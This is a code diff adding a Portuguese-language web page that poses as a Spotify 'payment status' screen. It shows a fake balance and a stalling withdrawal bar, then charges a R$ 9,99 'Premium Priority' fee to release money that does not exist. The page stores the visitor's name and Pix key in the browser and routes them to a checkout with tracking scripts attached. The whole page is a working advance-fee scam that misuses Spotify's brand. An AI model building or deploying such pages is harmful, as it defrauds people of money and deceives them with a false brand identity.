@@ -1,0 +1,998 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Status do Envio | Spotify</title>
+
+<script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "uem62uib5t");
+</script>
+
+<!-- Facebook Pixel -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '949313014576281');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1597899204644792&ev=PageView&noscript=1"/></noscript>
+
+<style>
+:root{
+ --bg:#050505;--panel:#0c0c0c;--panel2:#0f0f0f;--line:#1f1f1f;
+ --green:#2cff5f;--text:#fff;--muted:#9a9a9a;--yellow:#ffd24d;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+body{
+  background:var(--bg);
+  color:var(--text);
+  font-family:Inter,-apple-system,BlinkMacSystemFont,'Segoe UI',Arial,sans-serif;
+  font-size:22px;
+  min-height:100vh;
+}
+.wrap{
+  max-width:440px;
+  margin:0 auto;
+  padding:12px;
+}
+.card{
+  background:linear-gradient(180deg,#0b0b0b,#030303);
+  border:1px solid var(--line);
+  border-radius:20px;
+  padding:16px;
+}
+
+/* Header / Balance */
+.header{
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  gap:8px;
+}
+.brand{
+  display:flex;
+  align-items:center;
+  gap:8px;
+}
+.brand-logo{
+  width:36px;
+  height:36px;
+  border-radius:12px;
+  border:1px solid #222;
+  object-fit:cover;
+}
+.brand strong{
+  font-size:22px;
+  font-weight:600;
+}
+.balance-box{
+  background:linear-gradient(145deg,#0b220f,#041108);
+  border:1px solid rgba(44,255,95,.35);
+  border-radius:12px;
+  padding:6px 12px;
+  text-align:right;
+  box-shadow:0 0 0 1px rgba(44,255,95,.15) inset;
+  flex-shrink:0;
+}
+.balance-label{
+  font-size:10px;
+  color:#b7ffd0;
+  line-height:1.2;
+}
+.balance-value{
+  font-size:15px;
+  font-weight:700;
+  color:var(--green);
+}
+
+/* Title */
+.title{
+  text-align:center;
+  margin:14px 0 4px;
+}
+.title h1{
+  font-size:20px;
+  font-weight:700;
+  color:var(--green);
+  margin:0;
+}
+.title p{
+  margin-top:4px;
+  font-size:13px;
+  color:#a7a7a7;
+}
+
+/* Status Card */
+.status-card{
+  background:#0b0b0b;
+  border:1px solid var(--line);
+  border-radius:14px;
+  padding:12px;
+  margin:12px 0;
+}
+
+/* PIX Identity */
+.pix-identity{
+  display:grid;
+  grid-template-columns:1fr auto;
+  grid-template-rows:auto auto;
+  gap:8px 10px;
+  padding:10px;
+  background:linear-gradient(180deg,#070707,#030303);
+  border:1px solid #141414;
+  border-radius:12px;
+  margin-bottom:10px;
+}
+.pix-left{
+  display:flex;
+  align-items:center;
+  gap:8px;
+}
+.pix-dot{
+  width:8px;
+  height:8px;
+  background:#2cff5f;
+  border-radius:50%;
+  box-shadow:0 0 6px rgba(44,255,95,.7);
+  flex-shrink:0;
+}
+.pix-left small,
+.pix-right small{
+  display:block;
+  font-size:9px;
+  color:#777;
+  line-height:1.2;
+}
+.pix-left strong{
+  font-size:16px;
+  font-weight:600;
+}
+.pix-right{
+  text-align:right;
+}
+.pix-right span{
+  font-size:16px;
+  color:#2cff5f;
+  font-weight:600;
+  letter-spacing:.3px;
+}
+.pix-meta{
+  grid-column:1 / span 2;
+  display:flex;
+  gap:6px;
+  flex-wrap:wrap;
+}
+.meta-chip{
+  background:#0e0e0e;
+  border:1px solid #222;
+  border-radius:999px;
+  padding:4px 8px;
+  font-size:9px;
+  color:#ccc;
+}
+
+/* Progress */
+.progress-bar{
+  width:100%;
+  height:8px;
+  margin-top:8px;
+  background:#0f0f0f;
+  border:1px solid var(--line);
+  border-radius:999px;
+  overflow:hidden;
+}
+.progress-fill{
+  width:72%;
+  height:100%;
+  background:linear-gradient(90deg,#2cff5f,#1fae4f);
+  transition:width 1.4s ease;
+}
+
+/* Steps */
+.steps{
+  display:flex;
+  gap:4px;
+  margin-top:10px;
+}
+.step{
+  flex:1;
+  text-align:center;
+  font-size:10px;
+  background:#101010;
+  border:1px solid var(--line);
+  border-radius:999px;
+  padding:6px 4px;
+  color:#666;
+  line-height:1.3;
+}
+.step.done{
+  color:var(--green);
+  border-color:rgba(44,255,95,.45);
+}
+.step.active{
+  color:#fff;
+  border-color:rgba(255,210,77,.8);
+  box-shadow:0 0 0 1px rgba(255,210,77,.15) inset;
+  animation:glow 1.4s infinite;
+}
+
+@keyframes glow {
+  0%{box-shadow:0 0 0 rgba(255,210,77,0)}
+  50%{box-shadow:0 0 10px rgba(255,210,77,.6)}
+  100%{box-shadow:0 0 0 rgba(255,210,77,0)}
+}
+
+/* Plan Compare */
+.plan-compare{
+  display:grid;
+  grid-template-columns:1fr 1fr;
+  gap:10px;
+  margin-top:14px;
+}
+.plan{
+  background:#0f0f0f;
+  border:1px solid #1f1f1f;
+  border-radius:14px;
+  padding:14px;
+  position:relative;
+  overflow:hidden;
+}
+.plan-head{
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  gap:6px;
+  margin-bottom:10px;
+}
+.plan-icon{
+  font-size:28px;
+  background:#111;
+  border:1px solid #222;
+  padding:8px 14px;
+  border-radius:999px;
+}
+.plan-head strong{
+  font-size:18px;
+  font-weight:700;
+  letter-spacing:.2px;
+  text-align:center;
+}
+.plan.standard .plan-head strong{
+  color:#fff;
+}
+.plan.premium .plan-head strong{
+  color:#2cff5f;
+}
+.plan ul{
+  list-style:none;
+  padding:0;
+  margin:0;
+}
+.plan ul li{
+  font-size:15px;
+  color:#b7b7b7;
+  margin-bottom:8px;
+  padding-left:16px;
+  position:relative;
+  line-height:1.6;
+}
+.plan ul li::before{
+  content:"•";
+  position:absolute;
+  left:0;
+  color:#555;
+}
+.plan-footer{
+  margin-top:10px;
+  text-align:center;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  gap:2px;
+}
+.plan-price{
+  font-size:16px;
+  font-weight:700;
+  color:#666;
+}
+.plan-price.highlight{
+  color:#2cff5f;
+}
+.plan-btn{
+  display:block;
+  margin:10px 0 6px;
+  background:#2cff5f;
+  color:#000;
+  padding:12px 10px;
+  border-radius:12px;
+  text-decoration:none;
+  font-weight:700;
+  font-size:16px;
+  text-align:center;
+}
+.plan-footer small{
+  font-size:10px;
+  color: #666
+}
+
+/* Premium destaque */
+.plan.premium{
+  border-color:rgba(44,255,95,.55);
+  box-shadow:0 0 0 1px rgba(44,255,95,.12) inset;
+}
+.ribbon{
+  position:absolute;
+  top:8px;
+  right:-30px;
+  transform:rotate(25deg);
+  background:rgba(44,255,95,.18);
+  border:1px solid rgba(44,255,95,.35);
+  color:#2cff5f;
+  font-weight:700;
+  font-size:8px;
+  padding:3px 36px;
+  letter-spacing:.3px;
+}
+
+/* FAQ */
+.faq-box{
+  margin-top:14px;
+  background:#0b0b0b;
+  border:1px solid #1f1f1f;
+  border-radius:14px;
+  padding:14px;
+}
+.faq-box h3{
+  text-align:center;
+  font-size:16px;
+  font-weight:600;
+  color:#aaa;
+  margin-bottom:12px;
+}
+.faq-item{
+  border-top:1px solid #1a1a1a;
+  padding:5px 0;
+}
+.faq-item:first-child{
+  border-top:none;
+  padding-top:0;
+}
+.faq-item strong{
+  display:block;
+  font-size:15px;
+  font-weight:600;
+  color:#fff;
+  margin-bottom:6px;
+}
+.faq-item span{
+  font-size:12px;
+  color:#aaa;
+  line-height:1.2;
+  text-align:center;
+}
+.faq-item.link a{
+  display:inline-block;
+  margin-top:6px;
+  color:#2cff5f;
+  font-weight:600;
+  text-decoration:none;
+  font-size:12px;
+}
+.faq-item.link a:hover{
+  text-decoration:underline;
+}
+
+/* Footer */
+footer{
+  text-align:center;
+  font-size:13px;
+  color:#555;
+  margin-top:14px;
+  padding-bottom:6px;
+}
+footer a{
+  color:#777;
+  text-decoration:none;
+}
+footer a:hover{
+  text-decoration:underline;
+}
+
+/* ==========================================
+   RESPONSIVIDADE - MEDIA QUERIES
+   ========================================== */
+
+/* Telas muito pequenas (320px - 360px) */
+@media (max-width:360px){
+  .wrap{
+    padding:8px;
+  }
+  .card{
+    padding:12px;
+    border-radius:16px;
+  }
+  .brand-logo{
+    width:32px;
+    height:32px;
+  }
+  .brand strong{
+    font-size:22px;
+  }
+  .balance-box{
+    padding:5px 10px;
+  }
+  .balance-value{
+    font-size:14px;
+  }
+  .title h1{
+    font-size:24px;
+  }
+  .title p{
+    font-size:16px
+  }
+  .status-card{
+    padding:10px;
+  }
+  .pix-identity{
+    padding:8px;
+    gap:6px 8px;
+  }
+  .pix-left strong,
+  .pix-right span{
+    font-size:11px;
+  }
+  .steps{
+    gap:3px;
+  }
+  .step{
+    font-size:12px;
+    padding:5px 2px;
+  }
+  .plan-compare{
+    grid-template-columns:1fr 1fr;
+    gap:6px;
+  }
+  .plan{
+    padding:10px;
+  }
+  .plan-head strong{
+    font-size:22px;
+  }
+  .plan ul li{
+    font-size:12px;
+    margin-bottom:6px;
+  }
+  .plan-btn{
+    padding:10px 6px;
+    font-size:12px;
+  }
+  .faq-box{
+    padding:10px;
+  }
+  .faq-item strong{
+    font-size:12px;
+  }
+  .faq-item span{
+    font-size:12px;
+  }
+}
+
+
+/* Telas médias (361px - 400px) */
+@media (min-width:361px) and (max-width:400px){
+  .card{
+    padding:14px;
+  }
+  .step{
+    font-size:9px;
+  }
+}
+
+/* Telas maiores (401px+) */
+@media (min-width:401px){
+  .wrap{
+    padding:16px;
+  }
+  .card{
+    padding:18px;
+  }
+  .title h1{
+    font-size:22px;
+  }
+  .step{
+    font-size:10px;
+    padding:7px 4px;
+  }
+  .plan ul li{
+    font-size:11px;
+  }
+}
+
+/* Telas grandes (tablets e desktops) */
+@media (min-width:500px){
+  .wrap{
+    max-width:460px;
+    padding:20px;
+  }
+  .card{
+    padding:20px;
+    border-radius:24px;
+  }
+  .title{
+    margin:16px 0 6px;
+  }
+  .title h1{
+    font-size:24px;
+  }
+  .title p{
+    font-size:22px;
+  }
+  .status-card{
+    padding:14px;
+    margin:14px 0;
+  }
+  .plan-compare{
+    gap:12px;
+    margin-top:16px;
+  }
+  .plan{
+    padding:14px;
+  }
+  .faq-box{
+    padding:14px;
+  }
+}
+
+/* Preferência de movimento reduzido */
+@media (prefers-reduced-motion:reduce){
+  .step.active{
+    animation:none;
+  }
+  .progress-fill{
+    transition:none;
+  }
+}
+
+/* Modo escuro forçado (já é escuro por padrão) */
+@media (prefers-color-scheme:light){
+  /* Mantém o tema escuro mesmo em preferência clara */
+  body{
+    background:var(--bg);
+    color:var(--text);
+  }
+}
+
+/* ==========================================
+   MODAL
+   ========================================== */
+
+.modal-overlay{
+  position:fixed;
+  top:0;
+  left:0;
+  width:100%;
+  height:100%;
+  background:rgba(0,0,0,.85);
+  display:none;
+  justify-content:center;
+  align-items:center;
+  z-index:9999;
+  padding:20px;
+}
+.modal-overlay.active{
+  display:flex;
+}
+.modal-box{
+  background:linear-gradient(180deg,#0b0b0b,#030303);
+  border:1px solid var(--line);
+  border-radius:20px;
+  padding:24px;
+  max-width:360px;
+  width:100%;
+  position:relative;
+  text-align:center;
+}
+.modal-close{
+  position:absolute;
+  top:12px;
+  right:16px;
+  background:none;
+  border:none;
+  color:#666;
+  font-size:24px;
+  cursor:pointer;
+  padding:0;
+  line-height:1;
+}
+.modal-close:hover{
+  color:#fff;
+}
+.modal-alert{
+  font-size:48px;
+  margin-bottom:12px;
+}
+.modal-box h2{
+  font-size:20px;
+  font-weight:700;
+  color:var(--yellow);
+  margin:0 0 12px;
+}
+.modal-text{
+  font-size:14px;
+  color:#aaa;
+  line-height:1.5;
+  margin-bottom:16px;
+}
+.modal-text strong{
+  color:#fff;
+}
+.modal-info{
+  background:#0f0f0f;
+  border:1px solid var(--line);
+  border-radius:12px;
+  padding:12px;
+  margin-bottom:16px;
+  text-align:left;
+}
+.modal-info div{
+  font-size:13px;
+  color:#888;
+  padding:6px 0;
+  border-bottom:1px solid #1a1a1a;
+}
+.modal-info div:last-child{
+  border-bottom:none;
+}
+.modal-highlight{
+  background:linear-gradient(135deg,rgba(44,255,95,.1),rgba(44,255,95,.05));
+  border:1px solid rgba(44,255,95,.3);
+  border-radius:12px;
+  padding:14px;
+  margin-bottom:16px;
+}
+.modal-highlight strong{
+  display:block;
+  font-size:14px;
+  color:#fff;
+  margin-bottom:8px;
+}
+.modal-highlight p{
+  font-size:13px;
+  color:#aaa;
+  margin:0;
+  line-height:1.5;
+}
+.modal-highlight span{
+  color:var(--green);
+  font-weight:600;
+}
+.modal-btn{
+  display:block;
+  background:var(--green);
+  color:#000;
+  padding:14px 20px;
+  border-radius:12px;
+  text-decoration:none;
+  font-weight:700;
+  font-size:15px;
+  margin-bottom:10px;
+}
+.modal-btn:hover{
+  background:#1fdf50;
+}
+.modal-secondary{
+  width:100%;
+  background:transparent;
+  border:1px solid #333;
+  color:#666;
+  padding:12px 20px;
+  border-radius:12px;
+  font-size:13px;
+  cursor:pointer;
+}
+.modal-secondary:hover{
+  border-color:#555;
+  color:#888;
+}
+
+/* Elementos clicáveis */
+.balance-box{
+  cursor:pointer;
+  transition:transform .2s,box-shadow .2s;
+}
+.balance-box:hover{
+  transform:scale(1.02);
+  box-shadow:0 0 15px rgba(44,255,95,.2);
+}
+.plan.standard{
+  cursor:pointer;
+  transition:transform .2s,border-color .2s;
+}
+.plan.standard:hover{
+  transform:scale(1.02);
+  border-color:rgba(255,210,77,.4);
+}
+</style>
+
+<script>
+document.addEventListener("DOMContentLoaded", () => {
+
+  let progress = 72;
+
+  const bar = document.getElementById("progressFill");
+  const process = document.getElementById("stepProcess");
+  const pix = document.getElementById("stepPix");
+
+  if(!bar || !process || !pix){
+    console.log("Erro: elementos não encontrados");
+    return;
+  }
+
+  function animateFlow(){
+    if(progress < 85){
+      progress += 2;
+      bar.style.width = progress + "%";
+    }
+  }
+
+  setInterval(animateFlow, 1200);
+
+  setTimeout(()=>{
+    process.classList.add("done");
+    process.classList.remove("active");
+    pix.classList.add("active");
+    pix.innerHTML = "⏳ Pix";
+  }, 12000);
+
+});
+</script>
+
+</head>
+
+<body>
+<div class="wrap">
+<div class="card">
+
+<div class="header">
+  <div class="brand">
+    <img src="images/spotify-logo.png" class="brand-logo" alt="Spotify">
+    <strong>Spotify</strong>
+  </div>
+  <div class="balance-box">
+    <div class="balance-label">Saldo disponível</div>
+    <div class="balance-value">R$ 382,76</div>
+  </div>
+</div>
+
+<div class="title">
+  <h1>Status do envio</h1>
+  <p>Central de Processamento de Pagamentos</p>
+</div>
+
+<div class="status-card">
+
+  <!-- IDENTIDADE DO SAQUE -->
+  <div class="pix-identity">
+    <div class="pix-left">
+      <span class="pix-dot"></span>
+      <div>
+        <small>Titular registrado</small>
+        <strong id="pixNome">Carregando…</strong>
+      </div>
+    </div>
+
+    <div class="pix-right">
+      <small>Chave Pix</small>
+      <span id="pixChave">••••••••</span>
+    </div>
+
+    <div class="pix-meta">
+      <div class="meta-chip">⏳ Fila padrão</div>
+      <div class="meta-chip">Próx: Pix</div>
+    </div>
+  </div>
+
+  <!-- BARRA -->
+  <div class="progress-bar">
+    <div class="progress-fill" id="progressFill"></div>
+  </div>
+
+  <!-- ETAPAS -->
+  <div class="steps">
+    <div class="step done">✔ Solicitação</div>
+    <div class="step done">✔ Verificação</div>
+    <div class="step active" id="stepProcess">⏳ Processamento</div>
+    <div class="step" id="stepPix">○ Pix</div>
+  </div>
+
+</div>
+
+<div class="plan-compare">
+
+  <div class="plan standard">
+    <div class="plan-head">
+      <span class="plan-icon">🐢</span>
+      <strong>Fila padrão</strong>
+    </div>
+
+    <ul>
+      <li>Verificação manual</li>
+      <li>Processada por humanos</li>
+      <li>Prazo padrão: até 30 dias úteis</li>
+    </ul>
+
+    <div class="plan-footer">
+      <span class="plan-price">R$ 0,00</span>
+      <small>Incluso no sistema</small>
+    </div>
+  </div>
+
+  <div class="plan premium">
+    <div class="ribbon">RECOMENDADO</div>
+
+    <div class="plan-head">
+      <span class="plan-icon">⚡</span>
+      <strong>Prioridade Premium</strong>
+    </div>
+
+    <ul>
+      <li>Verificação automática</li>
+      <li>Saque instantâneo</li>
+      <li>Liberação em até 5 minutos</li>
+    </ul>
+
+    <div class="plan-footer">
+      <span class="plan-price highlight">R$ 9,99</span>
+      <a href="../checkout/loading.html?produto=Prioridade%20Premium&valor=999" class="plan-btn">
+        Desbloquear agora
+      </a>
+      <small>Opcional · não altera seu saldo</small>
+    </div>
+  </div>
+
+</div>
+
+<div class="faq-box">
+  <h3>Dúvidas frequentes</h3>
+
+  <div class="faq-item">
+    <strong>Sou obrigado a ativar a Prioridade Premium?</strong>
+    <span>Não. Você pode aguardar normalmente na fila padrão sem custo adicional.</span>
+  </div>
+
+  <div class="faq-item">
+    <strong>Meu saldo muda ao ativar?</strong>
+    <span>Não. O valor do seu saldo é o mesmo — a prioridade altera apenas a forma de processamento.</span>
+  </div>
+
+  <div class="faq-item">
+    <strong>O que exatamente estou pagando?</strong>
+    <span>Você paga a ativação de rotinas automáticas e uma fila separada de processamento.</span>
+  </div>
+
+  <div class="faq-item">
+    <strong>O saldo fica seguro se eu não pagar?</strong>
+    <span>Sim. Ele permanece registrado até a conclusão completa do fluxo.</span>
+  </div>
+
+  <div class="faq-item link">
+    <strong>Quais são todas as regras de saque?</strong>
+    <a href="../regrasdesaque/" id="regrasLink">
+      Ver regras completas de saque →
+    </a>
+  </div>
+</div>
+
+<footer>
+  <a href="https://www.spotify.com/br-pt/legal/end-user-agreement/">Termos</a> · 
+  <a href="https://www.spotify.com/br-pt/legal/privacy-policy/">Privacidade</a>
+</footer>
+
+</div>
+</div>
+
+<!-- Modal Fila Padrão -->
+<div class="modal-overlay" id="modalOverlay">
+  <div class="modal-box">
+    <button class="modal-close" id="closeModal">×</button>
+    <div class="modal-alert">⚠️</div>
+    <h2>Fila Padrão</h2>
+    <p class="modal-text">
+      Sua solicitação está na <strong>fila padrão</strong>, onde os saques são processados manualmente por nossa equipe. O prazo pode chegar a <strong>30 dias úteis</strong> e não há garantia de prioridade.
+    </p>
+    <div class="modal-info">
+      <div>⏳ Verificação manual por humanos</div>
+      <div>📋 Sujeito à fila de espera</div>
+      <div>⚠️ Prazo de até 30 dias úteis</div>
+    </div>
+    <div class="modal-highlight">
+      <strong>⚡ Quer receber mais rápido?</strong>
+      <p>Com a <span>Prioridade Premium</span>, seu saque é processado automaticamente em até 5 minutos por apenas <span>R$ 9,99</span>.</p>
+    </div>
+    <a class="modal-btn" href="../checkout/loading.html?produto=Prioridade+Premium&valor=999" id="modalCheckoutBtn">⚡ Ativar Premium agora</a>
+    <button class="modal-secondary" id="continueStandard">Continuar na fila padrão</button>
+  </div>
+</div>
+
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+
+<script>
+document.addEventListener("DOMContentLoaded",()=>{
+
+  const params = new URLSearchParams(window.location.search);
+
+  const pix = params.get("pix") || localStorage.getItem("pix_chave") || "Não informado";
+  const nome = params.get("nome") || localStorage.getItem("pix_nome") || "Usuário registrado";
+
+  if(params.get("pix")) localStorage.setItem("pix_chave",pix);
+  if(params.get("nome")) localStorage.setItem("pix_nome",nome);
+
+  const nomeBox = document.getElementById("pixNome");
+  const pixBox = document.getElementById("pixChave");
+
+  if(nomeBox) nomeBox.innerText = nome;
+  if(pixBox) pixBox.innerText = pix.replace(/.(?=.{4})/g,"•");
+
+  // Preserva parâmetros no link de regras
+  const regrasLink = document.getElementById("regrasLink");
+  if(regrasLink && params.toString()){
+    regrasLink.href = "../regrasdesaque/?" + params.toString();
+  }
+
+  // Modal Fila Padrão
+  const modalOverlay = document.getElementById("modalOverlay");
+  const closeModal = document.getElementById("closeModal");
+  const continueStandard = document.getElementById("continueStandard");
+  const modalCheckoutBtn = document.getElementById("modalCheckoutBtn");
+  const balanceBox = document.querySelector(".balance-box");
+  const planStandard = document.querySelector(".plan.standard");
+
+  // Abrir modal ao clicar no saldo ou plano padrão
+  function openModal(e){
+    e.preventDefault();
+    modalOverlay.classList.add("active");
+  }
+
+  if(balanceBox) balanceBox.addEventListener("click", openModal);
+  if(planStandard) planStandard.addEventListener("click", openModal);
+
+  // Fechar modal
+  function closeModalFn(){
+    modalOverlay.classList.remove("active");
+  }
+
+  if(closeModal) closeModal.addEventListener("click", closeModalFn);
+  if(continueStandard) continueStandard.addEventListener("click", closeModalFn);
+
+  // Fechar ao clicar fora
+  modalOverlay.addEventListener("click", (e) => {
+    if(e.target === modalOverlay) closeModalFn();
+  });
+
+  // Preservar UTMs no link do checkout do modal
+  if(modalCheckoutBtn && params.toString()){
+    modalCheckoutBtn.href = "../checkout/loading.html?" + params.toString() + "&produto=Prioridade+Premium&valor=999";
+  }
+
+});
+</script>
+
+</body>
+</html>
